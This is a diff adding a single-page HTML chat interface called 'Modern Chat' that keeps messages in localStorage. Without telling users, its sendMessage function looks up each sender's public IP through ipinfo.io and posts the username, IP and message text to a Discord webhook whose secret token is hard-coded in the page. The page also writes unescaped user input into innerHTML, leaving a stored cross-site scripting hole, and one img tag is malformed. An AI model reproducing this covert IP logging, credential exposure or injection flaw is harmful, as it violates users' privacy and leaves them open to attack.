@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Modern Chat</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            background-color: #202020;
+            color: #ffffff;
+        }
+
+        #header {
+            text-align: center;
+            padding: 20px;
+        }
+
+        #header img {
+            max-width: 100%;
+            max-height: 150px;
+            border-radius: 10px;
+        }
+
+        #chat-container {
+            flex: 1;
+            overflow-y: scroll;
+            padding: 20px;
+        }
+
+        #input-container {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            background-color: #404040;
+        }
+
+        #message-input {
+            flex: 1;
+            padding: 10px;
+            margin-right: 10px;
+            border: none;
+            border-radius: 5px;
+            outline: none;
+            background-color: #505050;
+            color: #ffffff;
+        }
+
+        #send-button {
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            background-color: #0084ff;
+            color: #ffffff;
+            outline: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="header">
+        <img src="enricozon.png"Header Image">
+    </div>
+    <div id="chat-container"></div>
+    <div id="input-container">
+        <input type="text" id="message-input" placeholder="Type your message..." disabled>
+        <button id="send-button" onclick="sendMessage()" disabled>Send</button>
+    </div>
+
+    <script>
+        // Function to get the username from localStorage or prompt if not available
+        function getUsername() {
+            var storedUsername = localStorage.getItem("chatUsername");
+            if (!storedUsername) {
+                storedUsername = prompt("Please enter your username:");
+                if (!storedUsername) {
+                    // If the user cancels or enters an empty username, disable input and send button
+                    document.getElementById("message-input").disabled = true;
+                    document.getElementById("send-button").disabled = true;
+                    return "";
+                }
+                localStorage.setItem("chatUsername", storedUsername);
+            }
+            return storedUsername;
+        }
+
+        // Function to get the chat messages from localStorage
+        function getChatMessages() {
+            var storedMessages = localStorage.getItem("chatMessages");
+            return storedMessages ? JSON.parse(storedMessages) : [];
+        }
+
+        // Function to save the chat messages to localStorage
+        function saveChatMessages(messages) {
+            localStorage.setItem("chatMessages", JSON.stringify(messages));
+        }
+
+        // Function to update the chat display
+        function updateChatDisplay() {
+            var chatContainer = document.getElementById("chat-container");
+            var messages = getChatMessages();
+
+            // Display the chat messages in the container
+            chatContainer.innerHTML = messages.map(msg => `<p><strong>${msg.username}:</strong> ${msg.message}</p>`).join("");
+
+            // Scroll to the bottom of the chat container
+            chatContainer.scrollTop = chatContainer.scrollHeight;
+        }
+
+        // Function to send a message to Discord webhook
+        function sendToDiscord(message, username, ip) {
+            var webhookURL = 'https://discord.com/api/webhooks/1184527027651494019/_oR4JCEjKATDDrIHAmSJX7n1C6q-rQvVWIpD8HKkjTDPPz9rdfXADNtUGQsLf-Waw5yo';
+            var payload = {
+                content: `**${username} ${ip}** ha scritto: ${message}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                console.log('Message sent to Discord');
+            })
+            .catch(error => {
+                console.error('Error sending message to Discord', error);
+            });
+        }
+
+        // Function to send a message
+        function sendMessage() {
+            var messageInput = document.getElementById("message-input");
+            var message = messageInput.value.trim();
+
+            if (message !== "") {
+                var username = getUsername();
+
+                if (username !== "") {
+                    // Use a third-party service to get an approximation of the user's IP
+                    fetch('https://ipinfo.io/json')
+                        .then(response => response.json())
+                        .then(data => {
+                            var ip = data.ip || 'Unknown';
+                            var messages = getChatMessages();
+
+                            // Add the new message to the chat messages
+                            messages.push({ username, message, ip });
+
+                            // Save the updated chat messages
+                            saveChatMessages(messages);
+
+                            // Update the chat display
+                            updateChatDisplay();
+
+                            // Clear the input field
+                            messageInput.value = "";
+
+                            // Send the message to Discord webhook
+                            sendToDiscord(message, username, ip);
+                        })
+                        .catch(error => {
+                            console.error('Error getting IP address', error);
+                        });
+                }
+            }
+        }
+
+        // Initial setup: Get username and display existing chat messages
+        var username = getUsername();
+        if (username !== "") {
+            // If a valid username is available, enable input and send button
+            document.getElementById("message-input").disabled = false;
+            document.getElementById("send-button").disabled = false;
+        }
+        var messages = getChatMessages();
+        updateChatDisplay();
+    </script>
+</body>
+</html>
